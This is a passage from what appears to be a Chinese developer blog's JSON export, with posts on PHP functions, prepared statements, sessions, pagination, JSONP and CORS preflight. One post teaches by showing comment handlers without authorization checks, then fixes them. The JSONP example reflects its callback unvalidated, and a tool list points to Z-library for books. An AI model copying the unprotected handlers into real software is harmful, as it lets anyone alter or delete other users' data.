23:22:22';$result = explode('-', $date);// Array ( [0] =&gt; 2022 [1] =&gt; 02 [2] =&gt; 17 23:22:22 )print_r($result); intval($str) 把資料型態轉成數字 1var_dump(intval('10')); // [int] =&gt; 10 或也可以像 JS 裡的 parseInt(string, base) 來決定用幾進位解析： 1var_dump(intval('100', 2)); // int (4) 數學相關floor($number) 無條件捨去 注意：回傳值是 float 不是 int 1var_dump(floor(1.5)); // float(1) ceil($number) 無條件進位 注意：回傳值是 float 不是 int 1var_dump(ceil(1.3)); // float(2) round($number) 四捨五入 注意：回傳值是 float 不是 int 12var_dump(round(1.3)); // float(1)var_dump(round(1.5)); // float(2) 陣列相關array('key' =&gt; 'value') 建立 Array（或想成 Object） 123456&lt;?php// 很像 JS 的物件$likeObject = array('name' =&gt; 'PeaNu', 'age' =&gt; 20);// 熟悉的陣列$array = array(1, 2, 3);?&gt; sizeof(array) 查看 Array 的長度 1234&lt;?php$likeObject = array('name' =&gt; 'PeaNu', 'age' =&gt; 20);var_dump(sizeof($likeObject)); // int(2)?&gt; array_push($array, $value) 新增元素到最後面 1234$my_array = array(1, 2, 3, 4);array_push($my_array, 5);print_r($my_array);// Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 ) 裡面也可以 push 字串、陣列或物件的資料，就跟 JS 一樣。 array_unshift($array, $value) 新增元素到最前面 1234$my_array = array(1, 2, 3, 4);array_unshift($my_array, 0);// Array ( [0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 4 )print_r($my_array); array_pop($array) 刪除最後一個元素 1234$my_array = array(1, 2, 3, 4);array_pop($my_array);// Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 )print_r($my_array); array_shift($array) 刪除第一個元素 1234$my_array = array(1, 2, 3, 4);array_shift($my_array);// Array ( [0] =&gt; 2 [1] =&gt; 3 [2] =&gt; 4 )print_r($my_array); array_map($callback, $array) 跟 JS 的 Array.map() 一樣，不過要注意 PHP 不能像 JS 一樣把 function 當參數傳，所以寫法不太一樣： 123456789// 先定義好 functionfunction callback($item) { return $item * 2;}$my_array = array(1, 2, 3, 4);// 用字串表示執行哪個 function$result = array_map('callback', $my_array);// Array ( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 6 [3] =&gt; 8 )print_r($result); 避免 SQL Injection 的方法要改用 Prepared Statements 的方式來下 SQL： 123456789101112131415// login.php&lt;?php // 先準備好 sql，參數的部分改用 ? 這個 placeholder 來代替 $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES (?, ?)\"; // 接著把 sql 指令丟到 prepare()，進入準備階段 $stmt = $conn-&gt;prepare($sql); // 接著把值做綁定（綁定階段），'ss' 是代表兩個參數都是 string $stmt-&gt;bind_param('ss', $nickname, $content); // 到這邊才是真的執行 sql $result = $stmt-&gt;execute(); // 如果要拿出欄位的資，記得加上這一句 $result = $stmt-&gt;get_result(); // 這樣這邊才拿的到 $row = $result-&gt;fetch_assoc();?&gt; bind_param() 有四種型別： i（integer） d （double） s（string） b （Boolean） 內建變數 $_GET['id'] 取得 GET 的 id 值 $_POST['id'] 取得 POST 的 id 值 $_SESSION['username'] SESSION 中 username（讀取或設定） $_SERVER['REQUEST_URI'] 取得路徑（Domain 下的路徑） $_SERVER['HTTP_HOST'] 取得域名（主機名稱） $_COOKIE['username'] 取得 COOKIE 中的 username","link":"/2022/01/31/php-built-in-function/"},{"title":"PHP 當 POST 的資料格式為 JSON 時","text":"筆記起來。 簡述一般如果是用表單 POST 到後端時，後端可以用 $_POST 來取得資料。但是當前端不是傳的 Content-type 是 text/xml、application/xml、application/json 之類的話，$_POST 就拿不到。 所以這時候要改用 file_get_content 搭配 php://input 來取得。php://input 是用來讀取 request body 的內容。 總之呢，後端大概會這樣寫： 1$data = file_get_contents('php://input'); 這樣就能順利拿到 JSON 格式的資料了！","link":"/2022/02/27/php-file-get-contents/"},{"title":"PHP 如何取得最新一筆的資料 id？","text":"其實方法還蠻多種的，所以特別記一下。 各種方法 利用 MAX() 函式： 1SELECT MAX(id) AS id FROM todos; 利用 ORDER BY 和 LIMIT： 1SELECT todos.id FROM todos ORDER BY id DESC LIMIT 1; 利用 $conn-&gt;insert_id： 1234567$name = 'PeaNu';$sql = \"INSERT INTO users(name) VALUES(?)\";$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param('s', $name);$stmt-&gt;execute();// 這邊會自動去抓上一筆 auto_increment 產生的 id 值echo '上一筆新增的 id 值為' . $conn-&gt;insert_id; 以上，第三種應該會是最簡單的方式。","link":"/2022/03/08/php-get-newest-id/"},{"title":"用 PHP 實作分頁功能","text":"簡單記錄一下。 簡述基本的分頁功能有幾個要素： 目前頁數 總頁數 一頁要顯示幾筆資料 只要掌握這些原則就能做出一個很簡單的分頁功能，不過在那之前要先知道怎麼從資料庫裡面撈出正確的資料。 SQL 指令有個關鍵字是 LIMIT 跟 OFFSET，前者代表「顯示幾筆」後者代表「略過幾筆」。不過有部分的資料庫是用 LIMIT 和 逗號 來表示，例如： 1234-- 0 ~ 4 的資料SELECT * FROM comments LIMIT 5;-- 同樣是 0 ~ 4（略過 0 筆，顯示 5 筆）SELECT * FROM comments LIMIT 0, 5; 但有些資料只支援 OFFSET 的寫法，所以得這樣使用： 1234-- 0 ~ 4 的資料SELECT * FROM comments LIMIT 5 OFFSET 0;-- 5 ~ 10 的資料SELECT * FROM comments LIMIT 5 OFFSET 5; 總之呢，從上面可以看出 LIMIT 是固定的，只要不停地更新 OFFSET 就能產出這樣的規律： OFFSET = 0，顯示 0 ~ 4 的資料 OFFSET = 5，顯示 5 ~ 10 的資料 OFFSET = 10，顯示 11 ~ 15 的資料 OFFSET = 15，顯示 15 ~ 20 的資料 這樣就有分頁效果了。 正式實作這邊拿留言板來舉例，首先得在首頁宣告一些變數來儲存分頁資訊： page 目前頁數 per_page 一頁顯示幾筆資料 offset 略過幾筆資料，用來控制頁數 total_page 總共有幾頁，用來控制上限值 特別解釋一下 offset 的部分，這需要用到國小數學來設定： 1$offset = ($page-1) * $per_page; 假設 $page 的初始值為 1，意思是在第一頁的時候要略過 0 筆資料（0 x 5 = 0），第二頁的時候要略過 5 筆資料（ 1 x 5），以此類推，接著只要更新 $page，offset 就會跟著改變，這樣就完成了分頁邏輯。 接著只要搭配 &lt;a href=\"index.php?page=1\"&gt; 帶上 $_GET['page'] 的方式來控制分頁狀態（就像 errorCode 一樣），就可以根據參數值來決定現在要顯示哪些資料。 最後簡單示範一下，其實就是把上面全部組合起來而已： （這邊只是寫個概念，看的懂就好） 123456789101112131415161718&lt;?php // 一頁顯示 10 筆 $per_page = 10; // 預設第一頁 $page = 1; // 去資料庫撈出總共有幾筆資料 $total_count = $conn-&gt;query(\"SELECT COUNT(comments.id) AS total FROM comments\"); /* 無條件進位，假設有 11 筆資料，ceil(11 / 10) = 2，得到兩頁 如果用無條件捨去，floor(11 / 10) = 1，這樣就只有一頁，最後那筆被忽略掉了。 */ $total_pages = ceil($total_count / $per_page) // 算出 offset，決定等下的 SQL 怎麼下 $offset = ($page-1) * $per_page; // 最後就可以去撈資料了 $comments = $conn-&gt;query(\"SELECT * FROM comments LIMIT $per_page OFFSET $offset\"); ?&gt; 最後加上控制用的按鈕就 OK 了： 1234&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo 1; ?&gt;\"&gt;首頁&lt;/a&gt;&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo $page - 1;?&gt;\"&gt;上一頁&lt;/a&gt;&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo $page + 1;?&gt;\"&gt;下一頁&lt;/a&gt;&lt;a class=\"pagination__button\" href=\"index.php?page=&lt;?php echo $total_page; ?&gt;\"&gt;最後一頁&lt;/a&gt; 以上～","link":"/2022/02/15/php-pagination-system/"},{"title":"從 PHP 學習權限管理的重要性","text":"資訊安全不可疏忽。 簡述這裡想強調「看不到不代表摸不到」的概念。在實作編輯與刪除留言時，為了管理權限，我們在渲染畫面的時候多加一個判斷是只有自己的留言才會顯示編輯跟刪除的按鈕，像這樣： 火山矽肺病只有在自己登入後才可以編輯或刪除自己的留言。 雖然畫面上表面上看起來沒什麼問題，但其實這背後存在一個漏洞，等等讓我們繼續看下去。 你想不到的神展開這裡就不賣關子了，直接讓你看有什麼漏洞。 刪除別人的留言： 修改別人的留言： 發現問題為什麼會這樣？這得看一下我們是怎麼實作編輯與刪除功能的。 編輯留言： 1234567891011121314// handle_update_comment.php&lt;?php require_once('./conn.php'); // 拿到要修改的留言 id $id= $_POST['id']; // 留言的內容 $content = $_POST['content']; // 下指令更新 id=? 的留言內容 $sql = \"UPDATE comments SET content=? WHERE id=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('si', $content, $id); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; 刪除留言： 123456789101112// hande_delete_comment.php&lt;?php require_once('./conn.php'); // 拿到要刪除的留言 id $id= $_GET['id']; // 下指令把 id=? 的留言刪掉 $sql = \"UPDATE comments SET is_deleted=1 WHERE id=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('i', $id); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; 注意到問題了嗎？這兩段程式完全沒有做權限檢查。 為什麼一開始要強調「看不到不代表摸不到」？因為這就是問題所在，就算我讓前端畫面看起來不能動別人的留言，但我還是可以用「網址」發一個 GET 請求到後端，讓後端執行對應指令。 解決問題所以正確的作法應該是後端也要做權限檢查，既然已經有登入機制，那在做編輯、刪除或新增等等的資料時都應該要像登入一樣用 session 機制確保是使用者本人，才可以執行對應行為。 所以把剛剛的程式碼修改一下。 刪除留言： 123456789101112131415// hande_delete_comment.php&lt;?php require_once('./conn.php'); // 加上 session 機制 session_start(); $id= $_GET['id']; $username = $_SESSION['username']; // 加上 AND 來判斷 username 是否正確 $sql = \"UPDATE comments SET is_deleted=1 WHERE id=? AND username=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('is', $id, $username); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; 編輯留言： 12345678910111213141516&lt;?php require_once('./conn.php'); // 加上 session 機制 session_start(); $id= $_POST['id']; $content = $_POST['content']; $username = $_SESSION['username']; // 加上 AND 來判斷 username 是否正確 $sql = \"UPDATE comments SET content=? WHERE id=? AND username=?\"; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param('sis', $content, $id, $username); $stmt-&gt;execute(); header('Location: ./index.php');?&gt; 後記在做完這個 case 後體會到原來有些事情不是「單靠前端」就能解決的。像是表單驗證，即便前端先檢查過後端也要再檢查一次。為什麼？因為使用者很多時候可以繞過前端的檢查，直接向後端發 request，如果這時候後端沒有做檢查呢？那就挫咧但了。所以比起前端，後端更需要具備資訊安全的知識，這一點真的很重要，很重要。","link":"/2022/02/15/php-permission-problem/"},{"title":"如何 PHP 正確的清除 session","text":"總算找到解法了。 簡述先來看原本的做法： 12session_start();session_destroy(); 這樣子確實能清除 server 端的 session 資料，可是 client 端的 cookie 還是會保留。 所以這邊要教你怎麼把 client 端也清乾淨。 範例拿一個登入機制來當範例： 建立 session（登入） 12345678910session_set_cookie_params([ 'lifetime' =&gt; 3600, 'path' =&gt; '/peanu/blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax']);session_start();$_SESSION['username'] = 'peanu'; 刪除 session（登出） 123456789101112131415session_set_cookie_params([ 'lifetime' =&gt; 3600, 'path' =&gt; '/peanu/blog/', 'domain' =&gt; 'localhost', 'secure' =&gt; TRUE, 'httponly' =&gt; TRUE, 'samesite' =&gt; 'Lax']);// 這裡的參數會是從上面的設定來拿的，// 所以最好是統一設為一樣的，才不會出錯。$cookie_Info = session_get_cookie_params();session_start();// 這一行就是把 cookie 清掉的重點了setcookie(session_name(), '', time()-42000, $cookie_Info['path']);session_destroy(); 示範一下： 經過我多次測試後，得出一個重點： setcookie 的 path 參數一定要一樣，不然就會刪不掉。 再說一次，只要 path 不對，就算其他都正確也刪不掉，所以要特別注意。","link":"/2022/03/13/php-remove-session/"},{"title":"PHP require 和 include 的差別","text":"寫給自己看。 簡述在網路上爬了一些文章發現內容都是錯的，先釐清幾個錯誤觀念 require 不能用迴圈 12345678$i = 1;while ($i &lt;= 3) { require(\"./a_$i.php\"); $i++;}echo '第一支檔案' . $a_1 . '&lt;br&gt;';echo '第二支檔案' . $a_2 . '&lt;br&gt;';echo '第三支檔案' . $a_3 . '&lt;br&gt;'; 其實是 OK 的，我實測的結果如下： 123第一支檔案a_1第二支檔案a_2第三支檔案a_3 require 不能用 if else 做流程判斷 12345678$is_true = TRUE;if ($is_true) { require(\"./a_1.php\"); echo $a_1;} else { require(\"./a_2.php\"); echo $a_2;} 這一樣也可以，實測結果： 1a_1 真正的差別真正的差別在於，如果去引入不存在的檔案，include 會噴 Warning，require 會噴 Fatal error。而 Waning 跟 Fatal error 的差別是會不會繼續往下執行程式碼。前者會，後者不會，就這麼簡單。 require 不存在的檔案 12require('./a_12345.php'); // 不存在的檔案echo 'test'; 輸出結果： 123Warning: require(./a_12345.php): Failed to open stream: No such file or directory in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4Fatal error: Uncaught Error: Failed opening required './a_12345.php' (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php:4 Stack trace: #0 {main} thrown in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4 include 不存在的檔案 12include('./a_12345.php'); // 不存在的檔案echo 'test'; 輸出結果： 1234Warning: include(./a_12345.php): Failed to open stream: No such file or directory in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4Warning: include(): Failed opening './a_12345.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4test // &lt;--- 有往下執行 眼尖的話會發現兩個都是先噴 Warning，接著才決定要噴 Warning 還是 Fatal error。 關於這部分節錄一下文件的解釋： Files are included based on the file path given or, if none is given, the include_path specified. If the file isn’t found in the include_path, include will finally check in the calling script’s own directory and the current working directory before failing. The include construct will emit an E_WARNING if it cannot find a file; this is different behavior from require, which will emit an E_ERROR. Note that both include and require raise additional E_WARNINGs, if the file cannot be accessed, before raising the final E_WARNING or E_ERROR, respectively. 意思應該是說一開始會從我們給的路徑裡去找檔案，如果找不到的話 PHP 會從 include_path 給的值去找，如果還是找不到，會到目前執行腳本的資料夾再找一次，如果最後最後都還是找不到，include 就噴 Warning，require 就噴 Fatal Error。 所以上面的錯誤訊息才會有這一段： 1Failed opening './a_12345.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\peanu\\real-blog\\main.php on line 4 另外就是不管最後是 Warning 還是 Fatal Error 在那之前都會先噴一個 Warning，所以才會看到兩個都有 Warning。 總結來說，如果程式一定要依賴 require 進來的東西來執行，最好是用 require，這樣讀檔失敗的時候就會直接停止，但如果是可有可無的話就能用 include，來確保程式不會跑到一半就被中斷。 有沒有 once 的差別就是會不會重複引入而已，例如說： 沒有 once 123456789101112// a_1.php&lt;?php $a_1 = 'a_1'; echo $a_1 . '&lt;br&gt;';?&gt;// main.php&lt;?php include('./a_1.php'); include('./a_1.php'); include('./a_1.php');?&gt; 輸出結果： 123a_1a_1a_1 有 once 123456789101112// a_1.php&lt;?php $a_1 = 'a_1'; echo $a_1 . '&lt;br&gt;';?&gt;// main.php&lt;?php include_once('./a_1.php'); include_once('./a_1.php'); include_once('./a_1.php');?&gt; 輸出結果： 1a_1","link":"/2022/02/22/php-require-and-include/"},{"title":"PHP 內建的 session 方法","text":"簡單快速。 簡述在實作登入功能時需要用到 session 機制來處理 HTTP 的無狀態問題。第一種方法是自己開一個資料庫來建立 token 機制，第二種方法是用 PHP 提供的內建方法，後者會更方便一點。 關於手做 token 的方式可以參考這篇：當 Cookie 被竄改會怎麼樣？ 使用方式這裡簡單寫個程式碼，腦袋有個畫面就好。 備註：每次要用 session 的功能都要記得先 session_start() 才不會出錯。 123456789// pageA.php&lt;?php // 建立一個 session session_start(); // 設定要儲存的 key 與 value $_SESSION['username'] = 'PeaNu';?&gt;// 到頁面 B 的網址&lt;a href=\"./pageB.php\"&gt;到頁面 B&lt;/a&gt; 接著到頁面 B 就可以取得在 頁面 A 儲存的 session： 12345// pageB.php&lt;?php session_start(); echo $_SESSION['username']; // 'PeaNu'?&gt; 如果要刪除 session 可以這樣子： 1234567// delete_session.php&lt;?php session_start(); // 刪除 session session_destroy(); header(\"Location: ./pageB.php\");?&gt; 這時候頁面 B 就存不到 $_SESSION['username'] 的值了。 原理簡述其實背後的原理一樣是透過 cookie，只是內建的方法會在你的電腦裡建立一個 session 檔案，把要儲存的內容寫在裡面。 附註：精確一點來說是存在記憶體，所以電腦關機後就會消失了。 ; 在 xampp 底下有個 tmp 的資料夾：可以在裏頭找到對應的 session 檔案： 123456789───tmp ├───ibE87C ├───ibE87D ├───ibE87E ├───ibE88F ├───sess_8oadq07ei2b8g25muckbpfjs8n ├───sess_924h1hulv8fmfqkao4bj05249u =&gt; 就是它囉！ ├───sess_gukpo79ueg96nfld2mj5jo2sql ├───why 把它打開就會看到內容： 1username|s:5:\"peanu\"; 補一下以前沒有講清楚的地方。 雖然我上面說 session 是在你的電腦裡建立一個檔案來儲存，但要注意這句話是建立在「你的電腦屬於 Server 端」的情況下才成立。 再重申一次： Client 端儲存的是 session_id：924h1hulv8fmfqkao4bj05249u Server 端儲存的是 session_id 對應到的值：username:\"peanu\" 所以，今天你到一個有 session 機制的網頁，會儲存在你電腦裡的是 session_id（透過 cookie 保存），不是 username:\"peanu\"，真正的資料是儲存在 Server 那邊的，不是 client，不要搞錯了。 另外要補充的是，在執行 session_destroy() 時，會把 tmp 儲存的 session 資料給刪除，這時候 $_SESSION 就讀不到任何資料，雖然 application 裡還是會保留 PHPSESSID 這個 cookie。","link":"/2022/02/07/php-session/"},{"title":"PHP 中單引號與雙引號的差別","text":"一個小小的冷知識。 簡述直接來看例子： 12345&lt;?php $name = 'PeaNu'; echo \"My name is $name\"; echo 'My name is $name'; ?&gt; Output： 12My name is PeaNu;My name is $name; 有注意到嗎？在單引號的時候變數會被當成「字串」，雙引號的時候變數值會被「解析」，這就是兩者的差異。 所以網路上說單引號會讓 PHP 跑的比較快就是因為這樣，因為單引號的時候不用做「解析」這件事。 哪個比較好？在大部分情況其實差異不大，主要是在 SQL 語句，例如： 123&lt;?php $sql = \"INSERT INTO users(`name`, `gender`) VALUES ('PeaNu', 'Man')\";?&gt; 在 Value 值的部分原本的 MySQL 只認得「單引號」，不過後來 MySQL 有針對雙引號的部分做擴展支援，所以也不是什麼太大的問題，但還是要知道過去有這個問題。","link":"/2022/02/05/php-single-or-double-quotes/"},{"title":"套件大總匯","text":"把一些我覺得還不錯的套件給集合起來。 ICON Material-Icon Google 的 Icon heroicons 複製貼上即可用的 Icon iconmonstr 複製貼上即可用的 SVG fontawesomeicons 複製貼上即可用的 SVG CSS Ant Design 做後台系統很有名的 UI library chakra-u 看起來還不錯的 UI library mui 用過 React 的應該都知道 Tocas UI 我覺得很舒服的 UI library Milligram 提供輕量、舒服的現成樣式 Bootstrap5 這個大家應該都知道，但還是貼一下。 Bootstrap5-Examples 可以參考的 BS 範例，還不錯。 Bootswatch 快速打造不同的 BS 主題 Flex-Cheatsheet 快速查 Flex 屬性 Grid-Cheatsheet 快速查 Grid 屬性 Animista - CSS Animations on Demand CSS 動畫線上 Demo convertacolor 快速轉換顏色格式 Box Shadow CSS Generator 陰影製造器 color-gradient 製作漸層背景 fontawesome fontawesome v5 版本 animista 開箱即用的各種 CSS 動畫 Node.js request 讓你在 Node.js 上發出 request dotenv 讀取環境變數，好用！ jest FB 開源出來的 unit test 的套件 bcrypt 存密碼會用到的雜湊函式 pm2 一個幫你在背景跑 process 的猛套件 node-fetch 在 Node.js 上用 fetch JavaScript convertsimple 把 JS 轉成 JSON 格式 highlightjs 程式碼高亮樣式 highlightjs-line-numbers.js 幫 highlightjs 加上行數的套件 you-might-not-need-jquery 好用的 JavaScript 懶人包 jQuery Quick API Reference jQuery 快速查表 regex101 測試 RegExp 的匹配對象，很方便的網站！ Manage HTML DOM 操作 DOM 的 cheet sheet CKEditor 5 強大的文字編輯器 Event queue Event loop 的 Demo 網站 jquery-loading 輕鬆做出 loading 效果！ momentjs 操作 Date 的好幫手（已停止維護） dayjs 操作 Date 的好幫手 date-fns 一樣跟日期有關（最厲害的應該是計算時間間隔的功能） greensock 不想寫用 CSS 寫動畫？試試看這個吧 swiperjs 提到幻燈片時最常出現的名字 echarts 開箱即用的圖表工具 pdf.js 把 pdf 轉成 canvas jspdf 輸出 pdf 的工具 fabric.js 讓 canvas 更好操作的工具 React React-loading-overlay 在 React 上用的載入效果 react-md-editor 很好用的 markdown 編輯器 classnames 管理 class name 的好東西 formik 表單處理的小幫手 yup 表單驗證的小幫手 react-card-flip 卡片翻轉效果，方便！ React Icons 必備的 icon 神器 @tanem/react-nprogress 覺得官方文件很優秀的進度條效果 spinners-react 簡單、輕量、好用的 Spinner React Select 方便處理 SelectBox 的套件 notistack 彈跳通知好幫手 idle-timer 靠它來做閒置登出的功能 react-loader-spinner 漂亮的 loading（一） react-spinners 漂亮的 loading（二） React Native react-native-vector-icons Icon 必裝 react-native-bouncy-checkbox 小清新的 checkbox！ react-native-google-places-autocomplete google 搜尋地址神器 React Native Elements UI 庫~ lottie-react-native 很厲害的動畫圖案 CDN jQuery 就是 jQuery font-awesome 好用的 font-awesome CDN moment.js 操作 Date 的好幫手 MySQL Visual JOIN 視覺化的 SQL join 語法 API mocky 非常好用的自製 API reqres 可以直接使用，也很簡潔的 API restcountries 查詢國家資料的 API Twitch API 就是 Twitch，但它的 API 文件實在有點雜，所以貼在這比較方便查閱。 picsum 假圖產生 API gorest 測試用 API bigdatacloud 可以用經緯度查地址的 API（縣市 / 區域） yelp 餐廳相關的 API 圖片 Pexels 圖片素材 pixabay 圖片素材 unDraw MTR04 官網的圖片素材 loading-svg 一些免費 loading SVG 圖片。 其他 frontend tools 前端大集結！？ DirtyMarkup 把壓縮過後的原始碼打回原形 jsonlint 檢查 JSON 格式是否合法 OG 分享偵錯工具 檢查 SEO 的 OG 效果 Color Hunt 需要顏色上的靈感嗎？來這裡吧！ Colors 找單一顏色的話參考這裡 Apache JMeter 用來對 server 做壓力測試的好工具 chmod 計算機 Linux 的權限設定。懶得自己算的話可以參考這裡 stackblitz 跟 Codesandbox 差不多的東西 prettier VS Code 排版必備 whiteboardfox 線上畫圖的好東西 sketchpad 更好用的線上畫板 snappify 幫你的 code 拍出美顏秀秀 tree generator 線上產生資料夾結構文字 Z-library 沒錢買原文書的好網站","link":"/2022/01/06/plugin-collection/"},{"title":"PM2 基本指令","text":"懶人包。 基本指令 pm2 ls 現在跑起來的 Process pm2 start app.js 執行應用程式 pm2 stop &lt;id&gt; 暫停應用程式 pm delete &lt;id&gt; 刪除應用程式 pm2 restart &lt;id&gt; 重新啟動應用程式 pm2 log &lt;id&gt; 應用程式的 log pm2 info &lt;id&gt; 應用程式的詳細資訊","link":"/2022/04/06/pm2-commands/"},{"title":"實作 JSONP","text":"時代的眼淚？ 原理簡述利用 &lt;script&gt; 的 src=\"...\" 可以跨網域存取資料的特性，搭配 callback function 來實現跨域請求的技術。 要注意的是 JSONP 只能應用在 GET，沒辦法 POST，因為只有 GET 會透過網址帶資料給後端（可以參考這裡） 接下來我會分別實作「後端」跟「前端」實際在使用 JSONP 的時候會怎麼做設定。 後端該做的事大致的思路是這樣： 準備好要給前端的資料 取得 url 中的 query 字串 根據 query 回傳對應的內容（其實就是執行一個 function，讓前端可以透過 function 裡的參數拿到資料） 12345678910111213141516171819202122// 建立 server 的模組const http = require('http')// 解析 url 的模組const url = require('url');// 要傳給前端的資料（物件）const data = { name: 'PeaNu', age: 23}// 伺服器設定const server = http.createServer((req, res) =&gt; { // 解析 url =&gt; {callback: 'getUser'} const queryObject = url.parse(req.url, true).query // 存取 callback 屬性 =&gt; 'getUser' const yourFunction = queryObject.callback // 把資料傳入（記得要轉成純字串） =&gt; getUser(data) res.write(`${yourFunction}(${JSON.stringify(data)})`) // 送出 response res.end()})// 聽 5000 這個 portserver.listen(5000) 前端該做的事大致的思路是這樣： 建立一個用來接收資料的 function（getUser） 開一個 &lt;script&gt; 用 src 向伺服器發出請求，並帶上 callback 參數來對應到第一步設好的 function 這裡要特別強調一下順序：先定義 function =&gt; 發出 request 不然在發 request 的時候 function 根本就還沒被定義，就等著吃 error。 備註：除非你設定 &lt;script asnyc&gt; 強制轉成非同步，不然就一定要按照上面的順序。 12345678&lt;script&gt;// 在這裡定義好要接收資料的 functionfunction getUser(data) { console.log(data)}&lt;/script&gt;&lt;!-- 這裡定義 callback 參數的值，也就是上面的 function --&gt;&lt;script src=\"http://localhost:5000/callback=getUser\"&gt;&lt;/script&gt; 如果順利的話，最後就能成功拿到資料： 備註在這裡紀錄一下實作時碰到的問題。 本來我是想分成： 如果有帶上 callback 參數，後端就 回傳對應的 function 如果沒有帶參數，後端就 回傳純字串的 JSON 資料 所以後端的部分設定成這樣： 12345678910111213141516171819// 伺服器設定const server = http.createServer((req, res) =&gt; { // {callback: 'getUser'} const queryObject = url.parse(req.url, true).query // 'getUser' const yourFunction = queryObject.callback // 檢查前端有沒有帶上 callback 參數 if(yourFunction) { // 把資料傳入 =&gt; getUser(data) res.write(`${yourFunction}(${JSON.stringify(data)})`) // 送出 response res.end() } else { // 回傳 JSON 資料 res.write(JSON.stringify(data)) // 送出 response res.end() }}) 在有帶上 callback 參數的時候沒有問題，但是沒有的時候就會出現 CORB 的錯誤： 本來以為是回傳內容的問題，所以我又把 res.write(JSON.stringify(data)) 改成 res.write('hi')： 簡單來說，如果你想要用這種塞在 &lt;script&gt; 裡面的方式來傳 JSON 資料，那就 一定要用 JSONP 來傳，不然瀏覽器會把 response 給擋下來。 至於第二個 res.write('hi') 的結果也告訴我們，如果不是 JSON 資料的話就沒關係，但是這樣就沒有什麼意義了，因為等於前端只拿到一個裡面寫了 hi 的 js 檔案，所以最後執行這個檔案的時候才會噴 Uncaught ReferenceError。","link":"/2022/01/06/practice-jsonp/"},{"title":"被遺忘的 Preflight request","text":"除了 CROS 以外，這也很重要。 簡述如果只考慮「同源政策」的話，那下面這句話就能成立： 瀏覽器不論如何都會幫你發 request，只是會把 response 擋住。 這正是我以前的認知。但我一直忽略了一個東西，那就是除了同源政策以外，還有個東西叫做「Preflight request」，中文翻作「預檢請求」。 這個東西會改變上面說的論點，所以等一下會解釋： 什麼是 Preflight request？ 為什麼需要 Preflight request？ 關於 Preflight request簡單來說，Preflight request 的用途就是「幫你問 Server 這個 request 他接不接受？」。 例如說，在我串 Twitch API 的時後要發一個 request 去取得遊戲資訊，出來的結果長這樣： 裡面的內容是： 會發現種類是 OPTIONS，它的用途是問 Server 接收哪些請求，所以我們再來看 Server 是怎麼回的： 如果我想得沒錯的話，應該就是從上面那幾個東西來決定要不要送出下一個 request： access-control-allow-headers 接受哪些 header access-control-allow-methods 接受哪些 HTTP Methods access-control-allow-origin 接受哪些來源 總之呢，只要這階段沒過的話，下個 request 就不會發出去了。這一點很重要，請務必銘記在心。 為什麼需要 Preflight request你仔細想想就會發現「只有同源政策」是不夠的，為什麼？ 假設今天有個 API 是透過對 https://example.com/data/:id 發出一個 request 來刪除資料，會有一個問題：任何人都可以發 request 來刪東西。 為什麼會這樣？因為同源政策的機制是「就算不同源也一樣會幫你發 request，只是會擋掉 response」，意思是說不管有沒有開 CROS 這份 request 都會送出去，只是拿不到 response 而已，但文章還是被刪除了。 Preflight request 就是用來解決這個問題的，它不希望任何人都能跨來源發 request。 什麼時候會觸發 Preflight request首先要知道，CROS 會把 request 分成兩種： 簡單請求 非簡單請求 只要是非簡單請求，就會觸發 Preflight request，必須等到通過後才會幫你發 request。 那什麼是非簡單請求？詳細的定義蠻複雜的，可以參考 MDN。 總之呢，只要符合這兩點的話就一定是簡單請求： 用的方法是 GET 沒有自定義 header（像 Twitch 要加上驗證 token 就不符合） 所以常見的 POST PUT DELETE 通常都不是簡單請求，這時候就會透過 Preflight request 先做確認，才決定要不要發出去。","link":"/2022/03/15/preflight-request/"},{"title":"理解 function 傳遞參數的機制","text":"一個有點複雜的東西。 因為這個其實蠻複雜的，所以這裡希望你理解兩件事就好： 在 function 中修改引數的值會不會影響到外面的變數？ JavaScript 中只有 pass by value 或 pass by sharing（嚴格來說是屬於 pass by value 的底下之一） 修改引數的值會不會影響到外面的變數？先來看個例子： 12345678910111213function swap(a, b) { var temp = a a = b b = temp console.log(a, b)}var numberA = 10var numberB = 20console.log(numberA, numberB) // 10, 20swap(numberA, numberB) // 20, 10console.log(numberA, numberB) // 10, 20 這裡嘗試在 swap 中把兩個引數的值給交換，但顯然並不會影響到外面的變數（numberA，numberB） 也就是說可以把 function 想成是這樣子處理引數的： 12345678function swap(a, b) { var a = numberA // 10 var b = numberB // 20 var temp = a a = b b = temp console.log(a, b)} 有點類似於把 numberA 的「值」拷貝給 a，numberB 的「值」拷貝給 b。 不知道你還記得在 從 Object 的等號來真正理解變數 提到的變數儲存方式嗎？此時 numberA 儲存的是「10」這個值，所以 a = numberA 只是把 10 這個數字給 a 而已，不管我們對 a 做什麼，它都不應該影響到 numberA。 好，現在我們再看一個例子： 1234567891011121314function add(obj) { obj.number++ obj.newValue = 'Boom!' return 1}var myObj = { number: 10}console.log(myObj.number) // 10add(myObj)console.log(myObj.number) // 11console.log(myObj) // {number: 11, newValue: 'Boom!'} 